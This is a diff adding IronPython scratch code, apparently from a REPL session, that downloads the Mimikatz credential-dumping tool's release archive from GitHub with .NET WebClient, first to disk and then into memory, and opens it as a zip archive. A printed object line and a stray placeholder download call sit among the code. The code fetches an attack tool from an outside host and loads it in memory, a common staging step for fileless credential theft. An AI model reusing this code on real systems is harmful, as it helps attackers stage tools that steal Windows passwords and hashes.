@@ -173,3 +173,24 @@ wc = WebClient()
 from System.Net import ServicePointManager, SecurityProtocolType
 ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
 wc.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip", "mimikatz.zip")
+
+
+import clr
+from System.Net import WebClient
+from System.Net import ServicePointManager, SecurityProtocolType
+with WebClient() as wc:
+        ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
+        wc.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip", "mimikatz.zip")
+
+wc.DownloadData("url")
+from System.IO import MemoryStream
+clr.AddReference("System.IO.Compression")
+from System.IO.Compression import ZipArchive, ZipArchiveMode
+
+zip=wc.DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip")
+zipdata = MemoryStream(zip)
+
+archive = ZipArchive(zipdata, ZipArchiveMode.Read)
+print(archive)
+<System.IO.Compression.ZipArchive object at 0x000000000000002B [System.IO.Compression.ZipArchive]>
+
